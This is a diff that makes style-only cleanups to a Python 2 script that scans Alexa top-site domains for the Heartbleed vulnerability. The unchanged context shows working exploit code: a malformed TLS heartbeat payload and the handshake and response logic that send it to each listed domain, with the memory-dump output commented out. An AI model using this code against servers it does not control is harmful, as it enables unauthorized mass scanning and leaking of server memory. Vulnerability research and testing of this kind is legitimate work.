@@ -18,6 +18,7 @@ from optparse import OptionParser
 
 options = OptionParser(usage='%prog file max', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple domains, takes in Alexa top X CSV file')
 
+
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
@@ -44,20 +45,22 @@ hb = h2bin('''
 01 40 00
 ''')
 
+
 def hexdump(s):
     for b in xrange(0, len(s), 16):
-        lin = [c for c in s[b : b + 16]]
+        lin = [c for c in s[b: b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
-        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
+        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.')for c in lin)
         #print '  %04x: %-48s %s' % (b, hxdat, pdat)
     #print
+
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
     rdata = ''
     remain = length
     while remain > 0:
-        rtime = endtime - time.time() 
+        rtime = endtime - time.time()
         if rtime < 0:
             return None
         r, w, e = select.select([s], [], [], 5)
@@ -72,7 +75,7 @@ def recvall(s, length, timeout=5):
             rdata += data
             remain -= len(data)
     return rdata
-        
+
 
 def recvmsg(s):
     hdr = recvall(s, 5)
@@ -86,6 +89,7 @@ def recvmsg(s):
         return None, None, None
     #print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
     return typ, ver, pay
+
 
 def hit_hb(s):
     s.send(hb)
@@ -111,6 +115,7 @@ def hit_hb(s):
             #print 'Server returned error, likely not vulnerable'
             return False
 
+
 def is_vulnerable(domain):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(2)
@@ -127,7 +132,7 @@ def is_vulnerable(domain):
     #sys.stdout.flush()
     while True:
         typ, ver, pay = recvmsg(s)
-        if typ == None:
+        if typ is None:
             #print 'Server closed connection without sending Server Hello.'
             return None
         # Look for server hello done message.
@@ -139,32 +144,33 @@ def is_vulnerable(domain):
     s.send(hb)
     return hit_hb(s)
 
+
 def main():
     opts, args = options.parse_args()
     if len(args) < 2:
         options.print_help()
         return
 
-    counter_nossl = 0;
-    counter_notvuln = 0;
-    counter_vuln = 0;
+    counter_nossl = 0
+    counter_notvuln = 0
+    counter_vuln = 0
 
     f = open(args[0], 'r')
     for line in f:
         rank, domain = line.split(',')
         domain = domain.strip()
         print "Testing " + domain + "... ",
-        sys.stdout.flush();
-        result = is_vulnerable(domain);
+        sys.stdout.flush()
+        result = is_vulnerable(domain)
         if result is None:
             print "no SSL."
-            counter_nossl += 1;
+            counter_nossl += 1
         elif result:
             print "vulnerable."
-            counter_vuln += 1;
+            counter_vuln += 1
         else:
             print "not vulnerable."
-            counter_notvuln += 1;
+            counter_notvuln += 1
 
         if int(rank) >= int(args[1]):
             break
